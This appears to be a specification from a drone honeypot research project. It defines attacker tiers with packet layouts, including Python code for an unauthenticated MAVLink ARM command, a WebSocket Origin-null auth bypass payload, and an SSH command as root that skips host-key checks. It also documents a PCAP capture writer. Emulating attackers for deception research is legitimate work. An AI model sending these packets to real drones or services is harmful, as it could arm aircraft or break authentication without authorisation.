# MIRAGE-UAS Attack Packet Specification

## 1. MAVLink 2.0 Packet Binary Layout per Attacker Level

### L0 — Script Kiddie (Random Bytes)

No MAVLink framing. Raw random bytes sent to UDP ports 14550-14600:

```
Raw bytes: a3 f1 c2 9b 0e 47 d8 2c 1f 6a 3e 9d b7 04 ...
No FD magic byte → interceptor marks is_anomalous=True
```

### L1 — Basic (Valid HEARTBEAT)

MAVLink v2 HEARTBEAT (msgid=0, 9 bytes payload):

```python
import struct

# Payload (9 bytes)
payload = struct.pack("<IBBBBB",
    0,     # custom_mode = STABILIZE (uint32)
    2,     # type = MAV_TYPE_QUADROTOR (uint8)
    3,     # autopilot = MAV_AUTOPILOT_ARDUPILOTMEGA (uint8)
    0x51,  # base_mode = CUSTOM_MODE_ENABLED | SAFETY_ARMED (uint8)
    4,     # system_status = MAV_STATE_ACTIVE (uint8)
    3,     # mavlink_version = 3 (uint8)
)
```

Hex dump:
```
Offset  Hex                                              ASCII
00000   00 00 00 00 02 03 51 04 03                       ......Q..
```

### L2 — Intermediate (COMMAND_LONG ARM)

COMMAND_LONG (msgid=76, 33 bytes payload):

```python
import struct

# ARM command payload
payload = struct.pack("<fffffffHBB",
    1.0,              # param1 = 1.0 (ARM)
    0.0, 0.0, 0.0,   # param2-4
    0.0, 0.0, 0.0,   # param5-7
    400,              # command = MAV_CMD_COMPONENT_ARM_DISARM (uint16)
    1,                # target_system (uint8)
    1,                # target_component (uint8)
)
```

Hex dump:
```
Offset  Hex                                              ASCII
00000   00 00 80 3f 00 00 00 00 00 00 00 00 00 00 00 00  ...?............
00010   00 00 00 00 00 00 00 00 00 00 00 00 90 01 01 01  ................
                                              ^^^^       command=400
```

### L2 — PARAM_REQUEST_LIST (msgid=21)

```python
payload = struct.pack("<BB",
    1,  # target_system (uint8)
    1,  # target_component (uint8)
)
```

Hex dump: `01 01` (2 bytes)

### L3 — WebSocket CVE-2026-25253 Auth Bypass

HTTP Upgrade request with `Origin: null`:

```http
GET / HTTP/1.1
Host: 172.40.0.10:18790
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: null
```

After upgrade, JSON auth bypass payload:

```json
{"type": "auth", "token": ""}
```

### L3 — WebSocket skill_invoke

```json
{"type": "skill_invoke", "skill": "mavlink_telemetry"}
```

### L4 — Breadcrumb Chain Follow

Step 1: Parse auth response for token:
```json
{"type": "auth_result", "authenticated": true, "token": "a1b2c3d4e5f6...", "signing_key_fragment": "a1b2c3d4e5f6..."}
```

Step 2: Extract signing_key_fragment, attempt SSH with it:
```
ssh -o StrictHostKeyChecking=no -p 2222 root@172.40.0.10
```

Step 3: Follow any endpoint hints in responses:
```json
{"type": "ack", "endpoint": "http://172.40.0.10:19042/config"}
```

Step 4: Probe ghost service ports 19000-19500:
```
TCP connect 172.40.0.10:19042 → follow lure
```

---

## 2. PCAP Writer (src/cti_pipeline/pcap_writer.py)

The `PcapWriter` class captures MAVLink events to standard libpcap format.

### File Format

```
┌─────────────────────────────────────┐
│ Global Header (24 bytes)            │
│  magic:    0xA1B2C3D4 (LE)         │
│  version:  2.4                      │
│  snaplen:  65535                    │
│  linktype: 101 (Raw IP)            │
├─────────────────────────────────────┤
│ Packet Record 1                     │
│  ts_sec:    uint32 (LE)            │
│  ts_usec:   uint32 (LE)            │
│  incl_len:  uint32 (LE)            │
│  orig_len:  uint32 (LE)            │
│  data:      [incl_len bytes]       │
├─────────────────────────────────────┤
│ Packet Record 2 ...                 │
└─────────────────────────────────────┘
```

### Usage

```python
from cti_pipeline.pcap_writer import PcapWriter
from shared.models import MavlinkCaptureEvent

writer = PcapWriter("honey_01", "results/logs")
writer.write_event(event)
writer.close()
# Output: results/logs/capture_honey_01_1775430610.pcap
```

Enable via environment variable: `PCAP_ENABLED=true`
